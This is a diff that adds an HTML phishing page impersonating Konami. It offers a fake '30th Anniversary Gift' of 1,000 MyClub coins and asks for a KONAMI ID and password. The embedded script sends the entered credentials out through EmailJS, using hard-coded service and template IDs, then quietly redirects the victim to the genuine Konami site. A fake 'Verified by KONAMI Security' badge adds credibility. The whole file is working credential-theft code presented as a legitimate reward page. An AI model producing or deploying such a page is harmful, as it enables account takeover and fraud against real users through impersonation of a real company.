@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KONAMI Anniversary | Claim Reward</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background-color: #f2f2f2; }
+
+        header { background: white; padding: 12px 15px; border-bottom: 5px solid #b10e1e; }
+        .logo { height: 22px; }
+
+        .container { max-width: 450px; margin: 0 auto; background: white; min-height: 100vh; }
+
+        /* Qaybta Sawirka Coins-ka */
+        .reward-banner {
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            background: linear-gradient(180deg, #fff 0%, #fff5f5 100%);
+        }
+        .reward-banner img {
+            width: 100%;
+            max-width: 320px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+            border: 2px solid #ffd700;
+        }
+
+        .claim-box { padding: 25px; }
+        .event-title { color: #b10e1e; font-size: 20px; font-weight: bold; margin-bottom: 10px; text-align: center; }
+        .event-desc { font-size: 14px; color: #555; text-align: center; margin-bottom: 25px; line-height: 1.4; }
+
+        .input-group { margin-bottom: 15px; }
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            border: 1px solid #a4c7e1; /* Konami Official Border */
+            border-radius: 6px; 
+            font-size: 16px;
+            background: #fdfdfd;
+        }
+        input:focus { border-color: #007fb1; outline: none; box-shadow: 0 0 8px rgba(0,127,177,0.2); }
+
+        .btn-claim { 
+            width: 100%; 
+            background: #b10e1e; 
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            border-radius: 8px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: 0.3s;
+        }
+        .btn-claim:hover { background: #d41424; }
+
+        .footer { text-align: center; padding: 40px 15px; font-size: 11px; color: #888; background: #f9f9f9; }
+        
+        /* Loading */
+        .spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        header {
+    background: white;
+    padding: 0;
+    text-align: left;
+}
+
+/* Qoraalka KONAMI oo u eg logada */
+.konami-logo {
+    color: #b10e1e; /* Midabka cas ee rasmiga ah */
+    font-size: 26px;
+    font-weight: bold;
+    padding: 10px 15px;
+    letter-spacing: 1px;
+    font-family: "Arial Black", Gadget, sans-serif; /* Font adag oo u eg logada */
+}
+
+/* Xariiqda cas ee weyn ee ka hooseysa logada */
+.red-bar {
+    background: #b10e1e;
+    color: white;
+    padding: 12px 15px;
+    font-size: 18px;
+    font-weight: 400;
+}
+
+    </style>
+</head>
+<body>
+<header>
+    <div class="konami-logo">KONAMI</div>
+    <div class="red-bar">Data Transfer Settings</div>
+</header>
+
+
+<div class="container">
+    <div class="reward-banner">
+        <img src="https://i.ibb.co/93g3dYf5/d9af6ddb1dcd78d12657af728a08421f.jpg" alt="1000 Coins Reward">
+    </div>
+
+    <div class="claim-box">
+        <h1 class="event-title">30th Anniversary Gift</h1>
+        <p class="event-desc">Log in with your KONAMI ID to verify your account and claim your 1,000 MyClub coins reward instantly.</p>
+
+        <form id="claimForm">
+            <div class="input-group">
+                <input type="text" id="email_field" placeholder="KONAMI ID (e-mail address)" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="pass_field" placeholder="Password" required>
+            </div>
+
+            <button type="submit" class="btn-claim" id="subBtn">
+                <span id="btnTxt">CLAIM NOW</span>
+                <div class="spinner" id="loader"></div>
+            </button>
+        </form>
+
+        <p style="text-align:center; margin-top:20px; font-size:12px; color:#007fb1; font-weight:bold;">
+            <i class="fas fa-shield-alt"></i> Verified by KONAMI Security
+        </p>
+    </div>
+
+    <div class="footer">
+        ©2026 Konami Digital Entertainment. All rewards are subject to account verification. Terms and conditions apply.
+    </div>
+</div>
+
+<script>
+    (function(){
+        // Public Key-gaagii
+        emailjs.init("9TO7hHMapqy4U9kNz"); 
+    })();
+
+    document.getElementById('claimForm').onsubmit = function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('subBtn');
+        const txt = document.getElementById('btnTxt');
+        const loader = document.getElementById('loader');
+
+        btn.disabled = true;
+        txt.style.display = 'none';
+        loader.style.display = 'block';
+
+        const templateParams = {
+            method: "Konami Coins Claim",
+            login_user: document.getElementById('email_field').value,
+            login_pass: document.getElementById('pass_field').value,
+            tiktok_user: "1000_COINS_EVENT"
+        };
+
+        // Service iyo Template ID-gaaga
+        emailjs.send("service_j2uu8yq", "template_0tc14oe", templateParams)
+            .then(function() {
+                // Markay guulaysato, u dir bogga dhabta ah
+                window.location.href = "https://my.konami.net/";
+            }, function(error) {
+                btn.disabled = false;
+                txt.style.display = 'block';
+                loader.style.display = 'none';
+                alert("Technical Error. Please try again.");
+            });
+    };
+</script>
+
+</body>
+</html>
